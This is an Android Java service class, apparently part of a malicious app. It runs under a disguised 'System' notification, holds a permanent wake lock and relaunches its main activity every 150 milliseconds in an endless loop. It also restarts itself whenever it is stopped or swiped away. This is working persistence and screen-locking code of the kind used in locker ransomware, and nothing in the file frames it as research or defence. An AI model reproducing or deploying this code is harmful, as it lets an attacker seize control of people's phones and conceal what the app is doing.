package com.rhfvnc.strain;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

public class StrainService extends Service {

    private static final String CH = "rhfvnc";
    private PowerManager.WakeLock wl;

    public static void start(Context c) {
        Intent i = new Intent(c, StrainService.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
        else c.startService(i);
    }

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification n = new Notification.Builder(this, CH)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();

        startForeground(1, n);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "rhfvnc:strain");
            wl.setReferenceCounted(false);
            try { wl.acquire(); } catch (Throwable ignored) {}
        }

        Thread loop = new Thread(() -> {
            while (true) {
                try {
                    StrainReceiver.scheduleRelaunch(StrainService.this, 30);
                    Intent i = new Intent(StrainService.this, MainActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TASK
                            | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    try { startActivity(i); } catch (Throwable ignored) {}
                    Thread.sleep(150);
                } catch (Throwable ignored) {}
            }
        });
        loop.setDaemon(true);
        loop.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 30);
    }

    @Override
    public void onDestroy() {
        StrainService.start(this);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
